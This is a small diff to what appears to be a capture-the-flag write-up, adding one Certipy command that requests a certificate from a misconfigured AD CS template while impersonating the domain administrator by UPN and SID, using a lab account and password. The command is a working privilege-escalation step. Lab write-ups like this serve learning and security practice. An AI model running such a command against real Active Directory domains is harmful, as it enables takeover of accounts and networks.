@@ -613,5 +613,6 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
 First i need the administrator SID
 
 ```python
-
+certipy-ad req -u 'ca_svc' -p 'Password123!' -dc-ip '10.129.232.128' -ca 'sequel-DC01-CA' -template 'DunderMifflinAuthentication' -upn 'administrator@sequel.htb' -sid 'S-1-5-21-548670397-972687484-3496335370-500' -dns 'dc01.sequel.htb' -debug
 ```
+
